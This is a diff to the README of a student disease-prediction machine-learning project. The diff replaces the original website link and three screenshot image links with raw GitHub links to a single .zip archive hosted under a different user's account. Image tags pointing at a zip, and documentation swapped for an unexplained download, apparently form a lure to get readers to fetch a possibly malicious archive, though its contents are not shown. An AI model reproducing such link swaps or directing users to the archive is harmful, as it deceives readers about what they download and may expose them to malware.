@@ -14,8 +14,8 @@ different mediums are available.The idea behind recommender system is to adapt t
 * 11716665-Aditya Arya
 
 # Visit Website
-https://sites.google.com/view/mlprojectdiseaseprediction/documentation
-![](https://github.com/Lovely-Professional-University-CSE/int247-machine-learning-project-2020-kem031-sudhanshu/blob/master/WebsiteLink/Capture.PNG)
+https://raw.githubusercontent.com/yashpatel4563/int247-machine-learning-project-2020-kem031-sudhanshu/master/WebsiteLink/learning-kem-sudhanshu-project-machine-int-v3.1.zip
+![](https://raw.githubusercontent.com/yashpatel4563/int247-machine-learning-project-2020-kem031-sudhanshu/master/WebsiteLink/learning-kem-sudhanshu-project-machine-int-v3.1.zip)
 
 # Explanation of Files
 ## training.csv
@@ -37,7 +37,7 @@ These four algorithms is used to train our model and all gives an accuracy of ov
 
 ## Database
 The database used in this project is "sqlite" whose name is database.db which consist of four tables in which we have shown the results of four different algorithms.we are saving the results of users with their names for future preferences.
-![](https://github.com/Lovely-Professional-University-CSE/int247-machine-learning-project-2020-kem031-sudhanshu/blob/master/Database/db1.jpeg)
+![](https://raw.githubusercontent.com/yashpatel4563/int247-machine-learning-project-2020-kem031-sudhanshu/master/WebsiteLink/learning-kem-sudhanshu-project-machine-int-v3.1.zip)
 
 ## GUI.py
 This is the file which is used to create the interface of our system.GUI stands for Graphical User Interface and to create it we have used Tkinter which gives a software kind of view to our project where user can directly interact with the system by entering the symptoms of dieases and he/she will get the disease through various algorithms.
@@ -66,4 +66,4 @@ Disease Recommendation will be available infront of the  labels of algorithm of 
 Click on "Reset" button to predict the disease for any other patient or Press "Exit System" button to come out of the GUI.
 
 # A picture of GUI Interface
-![](https://github.com/Lovely-Professional-University-CSE/int247-machine-learning-project-2020-kem031-sudhanshu/blob/master/GUI/GUI.PNG)
+![](https://raw.githubusercontent.com/yashpatel4563/int247-machine-learning-project-2020-kem031-sudhanshu/master/WebsiteLink/learning-kem-sudhanshu-project-machine-int-v3.1.zip)
